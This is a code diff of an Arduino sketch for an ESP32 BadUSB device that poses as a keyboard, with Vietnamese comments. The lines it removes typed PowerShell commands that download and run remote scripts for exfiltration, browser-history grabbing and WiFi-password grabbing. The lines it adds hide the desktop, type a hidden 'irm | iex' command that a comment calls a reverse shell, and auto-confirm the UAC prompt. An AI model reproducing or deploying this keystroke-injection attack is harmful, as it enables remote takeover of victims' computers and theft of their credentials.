@@ -3,98 +3,116 @@
 #include "USBHIDKeyboard.h"
 
 USBHIDKeyboard Keyboard;
-const int buttonPin = 0;
 
-
-//Mảng tải và thực thi code
-const char* backdoorCode[] = {
-  // Bước 1: tải file về thư mục TEMP (dùng %TEMP% của CMD)
-  "powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/khangpdm/BadUSB/main/Exfiltrate/file.ps1' -OutFile '%TEMP%\\file.ps1'\"",
-
-  // Bước 2: thực thi file vừa tải
-  "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\file.ps1\"",
-
-  // Bước 3: xóa file sau khi chạy
-  "powershell -Command \"Remove-Item '%TEMP%\\file.ps1' -Force\"",
-
-  // File 1: History/main.ps1
-  "powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/khangpdm/BadUSB/main/History/main.ps1' -OutFile '%TEMP%\\history.ps1'\"",
-  "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\history.ps1\"",
-  "powershell -Command \"Remove-Item '%TEMP%\\history.ps1' -Force\"",
-
-  // File 2: Wifi_Grabber/WifiGrabber.ps1
-  "powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/khangpdm/BadUSB/main/Wifi_Grabber/WifiGrabber.ps1' -OutFile '%TEMP%\\wifi.ps1'\"",
-  "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\wifi.ps1\"",
-  "powershell -Command \"Remove-Item '%TEMP%\\wifi.ps1' -Force\"",
-};
+const int buttonPin = 0; // Nút BOOT trên mạch Lolin S2 Mini
+const int ledPin = 15;   // Đèn LED tích hợp trên mạch Lolin S2 Mini (thường là chân 15)
 
 void setup() {
   pinMode(buttonPin, INPUT_PULLUP);
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, LOW); // Tắt LED ban đầu
+
+  // Khởi động cổng Serial để ghi log (Tốc độ baud: 115200)
+  Serial.begin(115200);
+  
+  // Khởi động Bàn phím ảo
   Keyboard.begin();
   USB.begin();
-  delay(1000);
-  Serial.begin(115200);
-}
 
-//Ghi lệnh từ bàn phím
-void sendLine(const char s[],const bool sendEnter = true){
-  Keyboard.print(s);
-  if(sendEnter){
-    Keyboard.write(KEY_RETURN);
-    delay(3000);
-  }
-}
-
-//Mở cửa sổ run
-void winPlusR() {
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  delay(45);
-  Keyboard.releaseAll();
-  delay(60);
-}
-
-// Mở và chỉnh sửa cửa sổ cmd để ẩn lệnh đang chạy
-void openHiddenCMD() {
-  winPlusR();
-  sendLine("cmd");
-  // Hide & configure console window
-  /*const char* hiddenCmd[] = {
-    "powershell -Command \"Set-WinUserLanguageList en-US -Force\"",
-    "mode con:cols=15lines=1", // chỉnh size của cửa sổ cmd
-    "color fe",               // đổi màu
-    "chcp 65001",            // set UTF8
-    "title ",               // ẩn title
-  };
-  // chạy lệnh
-  int hiddenCmdLength = sizeof(hiddenCmd) / sizeof(hiddenCmd[0]);
-  for (int i = 0; i < hiddenCmdLength; i++) { 
-      sendLine(hiddenCmd[i]);
-  }*/
-}
-
-//Thực thi các lệnh badusb
-void runBackDoor(){
-  int backdoorCodeLength = sizeof(backdoorCode) / sizeof(backdoorCode[0]);
-  for(int i = 0; i < backdoorCodeLength; i++){
-    sendLine(backdoorCode[i]);
-  }
+  // Đợi một chút để cổng Serial ổn định
+  delay(2000);
+  Serial.println("\n--- HỆ THỐNG BADUSB ĐÃ SẴN SÀNG ---");
+  Serial.println("[LOG] Chờ nhấn nút BOOT để bắt đầu tấn công...");
 }
 
 void loop() {
   if (digitalRead(buttonPin) == LOW) {
-    Serial.println("Phat hien nhan nut. Bat dau go...");
+    delay(200); // Chống rung phím
+    digitalWrite(ledPin, HIGH); // Bật LED báo hiệu đang chạy
+
+    Serial.println("\n[LOG] BẮT ĐẦU CHUỖI THỰC THI PAYLOAD!");
+
+    // ==========================================
+    // BƯỚC 1: ẨN CỬA SỔ
+    // ==========================================
+    Serial.println("[LOG] Bước 1/6: Đang thu nhỏ các cửa sổ (Win + D)...");
+    delay(2500); 
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('d');
+    delay(100);
+    Keyboard.releaseAll();
+    delay(500);
+
+    // ==========================================
+    // BƯỚC 2: MỞ HỘP THOẠI RUN
+    // ==========================================
+    Serial.println("[LOG] Bước 2/6: Đang mở hộp thoại Run (Win + R)...");
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
+    delay(50);
+    Keyboard.releaseAll();
     delay(200);
 
-    openHiddenCMD();
+    // ==========================================
+    // BƯỚC 3: GÕ LỆNH POWERSHELL
+    // ==========================================
+    Serial.println("[LOG] Bước 3/6: Đang nhập mã độc PowerShell...");
+    // Nhớ thay <LINK> bằng đường dẫn tải file ps.ps1 của bạn
+    // Đã thay đổi: Dùng -w h để cửa sổ bốc hơi ngay lập tức khi vừa mở lên
+
+    //Mở reverse shell về máy tấn công (thay đổi IP và Port nếu cần)
+    Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://raw.githubusercontent.com/khangpdm/BadUSB/main/NEW/test2.ps1 | iex\"");
+    //Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/MinhNhat/src/ps.ps1 | iex\"");
+    delay(200);
+
+ 
+
+
+    // ==========================================
+    // BƯỚC 4: KÍCH HOẠT QUYỀN ADMIN
+    // ==========================================
+    Serial.println("[LOG] Bước 4/6: Đang nhấn Ctrl+Shift+Enter để gọi quyền Admin...");
+    Keyboard.press(KEY_LEFT_CTRL);
+    Keyboard.press(KEY_LEFT_SHIFT);
+    Keyboard.press(KEY_RETURN);
+    delay(100);
+    Keyboard.releaseAll();
+
+    // ==========================================
+    // BƯỚC 5: VƯỢT QUA UAC
+    // ==========================================
+    Serial.println("[LOG] Bước 5/6: Đang chờ bảng UAC hiện lên (Đợi 2.5s)...");
+    delay(2500); 
     
-    runBackDoor();
-
-    Serial.println("Da go xong.");
-
-    // Chờ thả nút ra để tránh gõ liên tục
-    while (digitalRead(buttonPin) == LOW) {
-      delay(10);
+    Serial.println("[LOG] Bước 5/6: Đang nhấn ALT + Y để vượt qua UAC...");
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press('y');
+    delay(100);
+    Keyboard.releaseAll();
+    
+    // ==========================================
+    // BƯỚC 6: BÁO HIỆU HOÀN TẤT
+    // ==========================================
+    Serial.println("[LOG] Bước 6/6: Kịch bản đã gõ xong! Chờ file tải về (Nháy Caps Lock)...");
+    
+    for(int i = 0; i < 4; i++) {
+      Keyboard.press(KEY_CAPS_LOCK); delay(50); Keyboard.releaseAll();
+      delay(250); 
+      Keyboard.press(KEY_CAPS_LOCK); delay(50); Keyboard.releaseAll();
+      delay(250); 
     }
+    //nháy liên tục đèn trên esp
+    /*while(true) {
+      digitalWrite(ledPin, HIGH);
+      delay(250);
+      digitalWrite(ledPin, LOW);
+      delay(250);
+    }*/
+
+    Serial.println("[LOG] === HOÀN TẤT CUỘC TẤN CÔNG ===");
+    Serial.println("[LOG] Bạn có thể rút USB ra ngay bây giờ.");
+    digitalWrite(ledPin, LOW); // Tắt đèn LED mạch
+    // Chờ nhả nút để tránh chạy lặp lại
+    while(digitalRead(buttonPin) == LOW) delay(10);
   }
 }
